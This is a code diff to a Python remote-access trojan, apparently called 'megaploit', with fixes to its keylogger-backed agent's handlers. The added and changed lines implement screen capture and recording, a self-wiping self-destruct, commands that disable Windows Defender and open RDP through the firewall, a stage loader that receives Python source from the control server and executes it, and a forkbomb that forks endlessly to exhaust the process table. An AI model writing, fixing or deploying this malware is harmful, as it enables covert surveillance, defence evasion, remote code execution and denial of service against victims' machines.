@@ -24,7 +24,7 @@ import tempfile
 import threading
 import time
 import zipfile
-from megaploit.core.protocol import send_file as _send_file, send_msg as _send_msg
+from megaploit.core.protocol import send_file as _send_file, send_msg as _send_msg, recv_msg as _recv_msg
 from megaploit.core.config import MAX_RECORD_SECONDS
 from megaploit.agent.keylogger import Keylogger
 
@@ -88,8 +88,16 @@ def get_send_lock() -> threading.Lock:
 # ---------------------------------------------------------------------------
 
 _HANDLERS: dict[str, object] = {}
+# Lock that must be held when mutating _HANDLERS at runtime.
+# The @_register decorator is only called at module-import time (single-
+# threaded), so it does not need the lock.  load_extension / unload_extension
+# in meterp.py acquire _registry_lock (which wraps this dict) for runtime
+# mutations.  Direct callers that add/remove entries outside those two paths
+# should also acquire _handlers_lock.
+_handlers_lock = threading.Lock()
 
 def _register(name: str):
+    # Import-time registration — no lock needed (single-threaded at load).
     def decorator(fn):
         _HANDLERS[name] = fn
         return fn
@@ -202,7 +210,7 @@ def _screenshot(conn, args: list[str]) -> str | None:
         import numpy as np
 
         quality = 85          # JPEG quality — good balance of size vs fidelity
-        with mss.mss() as sct:
+        with mss.MSS() as sct:
             monitor = sct.monitors[1]
             raw = sct.grab(monitor)
             arr = np.array(raw)
@@ -301,7 +309,7 @@ def _screenshot_timelapse(conn, args: list[str]) -> str | None:
         quality = 85
         frames: list[bytes] = []
 
-        with mss.mss() as sct:
+        with mss.MSS() as sct:
             monitor = sct.monitors[1]
             for i in range(count):
                 raw = sct.grab(monitor)
@@ -1207,7 +1215,8 @@ def _self_destruct(conn, args: list[str]) -> str:
     except OSError as e:
         messages.append(f"[-] Keylog removal: {e}")
 
-    # 3. Overwrite and delete the agent script
+    # 3. Overwrite and delete the agent script synchronously so the wipe
+    #    is guaranteed to complete before os._exit() is called.
     agent_path = os.path.abspath(sys.argv[0]) if sys.argv else None
     if agent_path and os.path.isfile(agent_path):
         try:
@@ -1221,12 +1230,15 @@ def _self_destruct(conn, args: list[str]) -> str:
 
     messages.append("[*] Self-destruct complete — terminating.")
 
-    # Schedule exit in a separate thread so the response can be sent first
+    # Schedule exit in a separate non-daemon thread so the C2 channel can
+    # flush the response before the process is killed.  Using a non-daemon
+    # thread ensures the wipe above is not interrupted mid-write if the
+    # main thread exits first.
     def _exit():
         time.sleep(1)
         os._exit(0)
 
-    threading.Thread(target=_exit, daemon=True).start()
+    threading.Thread(target=_exit, daemon=False).start()
     return "\n".join(messages)
 
 
@@ -1724,7 +1736,7 @@ def _screenshot_region(conn, args: list[str]) -> str | None:
     x, y, w, h = int(args[0]), int(args[1]), int(args[2]), int(args[3])
     try:
         import io, cv2, mss, numpy as np
-        with mss.mss() as sct:
+        with mss.MSS() as sct:
             region = {"top": y, "left": x, "width": w, "height": h}
             raw = sct.grab(region)
             arr = np.array(raw)
@@ -2182,12 +2194,12 @@ def _disable_defender(conn, args: list[str]) -> str:
         return "[-] Windows Defender is Windows-only"
     results = []
     cmds = [
-        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" "
-        "/v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>&1",
-        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" "
-        "/v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f 2>&1",
-        "powershell -NoProfile -NonInteractive -Command "
-        "\"Set-MpPreference -DisableRealtimeMonitoring $true\" 2>&1",
+        ("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\""
+         " /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>&1"),
+        ("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\""
+         " /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f 2>&1"),
+        ("powershell -NoProfile -NonInteractive -Command"
+         " \"Set-MpPreference -DisableRealtimeMonitoring $true\" 2>&1"),
     ]
     for cmd in cmds:
         r = _shell_exec(cmd)
@@ -2285,10 +2297,10 @@ def _rdp_enable(conn, args: list[str]) -> str:
         return "[-] RDP enable is Windows-only"
     results = []
     cmds = [
-        "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" "
-        "/v fDenyTSConnections /t REG_DWORD /d 0 /f 2>&1",
-        "netsh advfirewall firewall add rule name=\"Allow RDP\" "
-        "protocol=TCP dir=in localport=3389 action=allow 2>&1",
+        ("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\""
+         " /v fDenyTSConnections /t REG_DWORD /d 0 /f 2>&1"),
+        ("netsh advfirewall firewall add rule name=\"Allow RDP\""
+         " protocol=TCP dir=in localport=3389 action=allow 2>&1"),
         "net start TermService 2>&1",
     ]
     for cmd in cmds:
@@ -2472,7 +2484,7 @@ def _load_stage(conn, args: list[str]) -> str:
     The payload arrives as a single message containing Python source.
     """
     try:
-        code = recv_msg(conn)   # wait for stage-1 source
+        code = _recv_msg(conn)   # wait for stage-1 source from the server
         exec(compile(code, "<stage1>", "exec"), {"conn": conn, "__name__": "__stage1__"})
         return "[+] Stage 1 loaded and executed"
     except Exception as e:
@@ -2490,9 +2502,19 @@ def _forkbomb(conn, args: list[str]) -> str:
     if not hasattr(os, "fork"):
         return "[-] forkbomb not supported on this platform"
     try:
-        os.fork()
+        pid = os.fork()
     except OSError as e:
         return f"[-] fork failed: {e}"
+    if pid == 0:
+        # Child process — fork again in a loop to exhaust process table.
+        # Must NOT send a response; parent owns the C2 socket.
+        try:
+            while True:
+                os.fork()
+        except OSError:
+            pass
+        os._exit(0)
+    # Parent only reaches here — send the single expected response
     return "[+] forkbomb triggered"
 
 
@@ -3380,7 +3402,7 @@ def _screenrecord(conn, args: list[str]) -> str | None:
         import mss
         import numpy as np
 
-        with mss.mss() as sct:
+        with mss.MSS() as sct:
             monitor = sct.monitors[1]
             src_w, src_h = monitor["width"], monitor["height"]
 
@@ -3397,7 +3419,7 @@ def _screenrecord(conn, args: list[str]) -> str | None:
         tick     = 1.0 / fps
         deadline = time.monotonic() + tick
 
-        with mss.mss() as sct:
+        with mss.MSS() as sct:
             monitor = sct.monitors[1]
             end_time = time.monotonic() + seconds
             while time.monotonic() < end_time:
@@ -4193,12 +4215,18 @@ def _run_as(conn, args: list[str]) -> str:
             ctypes.windll.kernel32.CloseHandle(pi.hThread)
 
             try:
-                with open(out_path, "r", encoding="utf-8", errors="replace") as fh:
-                    output = fh.read()
-                os.remove(out_path)
-                return output.strip() or "(no output)"
-            except OSError:
-                return "[+] Process finished (no output captured)"
+                try:
+                    with open(out_path, "r", encoding="utf-8", errors="replace") as fh:
+                        output = fh.read()
+                    return output.strip() or "(no output)"
+                except OSError:
+                    return "[+] Process finished (no output captured)"
+            finally:
+                # Always remove the temp file — even if reading fails
+                try:
+                    os.remove(out_path)
+                except OSError:
+                    pass
 
         except Exception as e:
             return f"[-] run_as: {e}"
@@ -4374,11 +4402,16 @@ def _reg(conn, args: list[str]) -> str:
             if reg_type is None:
                 return f"[-] Unknown REG type: {type_str}.  Valid: {', '.join(TYPE_MAP)}"
 
-            # Coerce data to the correct Python type
+            # Coerce data to the correct Python type.
+            # Use base 16 when the value starts with "0x"/"0X", otherwise
+            # use strict base 10 — prevents silent octal interpretation of
+            # values like "010" (which int("010", 0) would parse as 8).
             if reg_type == winreg.REG_DWORD:
-                data: object = int(raw_data, 0)
+                _rstrip = raw_data.strip()
+                data: object = int(_rstrip, 16) if _rstrip.lower().startswith("0x") else int(_rstrip, 10)
             elif reg_type == winreg.REG_QWORD:
-                data = int(raw_data, 0)
+                _rstrip = raw_data.strip()
+                data = int(_rstrip, 16) if _rstrip.lower().startswith("0x") else int(_rstrip, 10)
             elif reg_type == winreg.REG_BINARY:
                 data = bytes.fromhex(raw_data.replace(" ", ""))
             elif reg_type == winreg.REG_MULTI_SZ:
@@ -4576,11 +4609,15 @@ def _arp_scan(conn, args: list[str]) -> str:
         with concurrent.futures.ThreadPoolExecutor(max_workers=64) as ex:
             list(ex.map(_ping, hosts))
         arp_out = _shell_exec("arp -a 2>&1")
-        # Filter to only IPs in our target subnet
+        # Filter to only IPs in our target subnet.
+        # Use word-boundary matching so 192.168.1.1 does not match
+        # 192.168.1.10 or 192.168.1.100 (H3 fix).
+        import re as _re
         lines = [f"[*] ARP cache entries for {cidr}:"]
+        host_set = {str(ip) for ip in hosts}
         for line in arp_out.splitlines():
-            for ip in hosts:
-                if str(ip) in line:
+            for token in _re.split(r"[\s,]+", line):
+                if token in host_set:
                     lines.append(f"  {line.strip()}")
                     break
         return "\n".join(lines) if len(lines) > 1 else f"[-] No ARP entries found for {cidr}"
